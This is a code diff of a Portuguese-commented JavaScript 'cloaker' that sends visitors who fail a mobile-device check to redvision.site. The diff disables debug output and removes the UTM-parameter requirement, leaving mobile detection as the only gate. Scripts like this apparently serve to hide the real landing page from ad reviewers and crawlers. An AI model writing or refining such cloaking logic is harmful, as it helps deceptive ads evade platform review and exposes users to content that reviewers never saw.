@@ -7,7 +7,7 @@
   "use strict";
 
   const REDIRECT_URL = "https://redvision.site";
-  const DEBUG = true; // ATIVADO para diagnóstico
+  const DEBUG = false; // Desativado - modo produção
 
   // Lista de parâmetros UTM válidos
   const VALID_PARAMS = [
@@ -35,11 +35,15 @@
 
   function redirect(reason) {
     log("BLOQUEADO: " + reason);
-    
+
     // Mostrar diagnóstico antes de redirecionar
     if (DEBUG) {
-      alert("CLOAKER DEBUG:\\n\\n" + debugInfo.join("\\n") + "\\n\\nVai redirecionar em 3s...");
-      setTimeout(function() {
+      alert(
+        "CLOAKER DEBUG:\\n\\n" +
+          debugInfo.join("\\n") +
+          "\\n\\nVai redirecionar em 3s...",
+      );
+      setTimeout(function () {
         window.location.replace(REDIRECT_URL);
       }, 3000);
     } else {
@@ -52,13 +56,17 @@
     const ua = navigator.userAgent || "";
 
     // Verificar User Agent para mobile
-    const isMobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS|FxiOS|SamsungBrowser/i.test(ua);
+    const isMobileUA =
+      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS|FxiOS|SamsungBrowser/i.test(
+        ua,
+      );
 
     // Verificar touch
     const hasTouch = "ontouchstart" in window || navigator.maxTouchPoints > 0;
 
     // iPad com iOS 13+ se identifica como MacIntel mas tem touch
-    const isIPad = navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1;
+    const isIPad =
+      navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1;
 
     log("User Agent: " + ua.substring(0, 50) + "...");
     log("É mobile UA: " + isMobileUA);
@@ -70,7 +78,7 @@
     // Muito permissivo: qualquer uma das condições
     const result = isMobileUA || hasTouch || isIPad;
     log("Resultado isMobile: " + result);
-    
+
     return result;
   }
 
@@ -78,7 +86,7 @@
   function hasValidUtm() {
     const search = window.location.search;
     log("Query string: " + search);
-    
+
     if (!search || search === "") {
       log("Query string vazia!");
       return false;
@@ -103,7 +111,7 @@
     log("=== CLOAKER INICIADO ===");
     log("URL: " + window.location.href);
 
-    // 1. Verificar mobile
+    // 1. Verificar mobile - ÚNICO REQUISITO
     const mobile = isMobile();
     if (!mobile) {
       redirect("Não é mobile");
@@ -111,18 +119,10 @@
     }
     log("✓ Passou check mobile");
 
-    // 2. Verificar UTM
-    const utm = hasValidUtm();
-    if (!utm) {
-      redirect("Sem UTM válido");
-      return;
-    }
-    log("✓ Passou check UTM");
-
-    // Passou em tudo!
+    // Passou - permite acesso!
     log("✓✓✓ ACESSO PERMITIDO! ✓✓✓");
     if (DEBUG) {
-      console.log("[Cloaker] Diagnóstico completo:", debugInfo);
+      console.log("[Cloaker] Mobile detectado - acesso liberado");
     }
   }
 
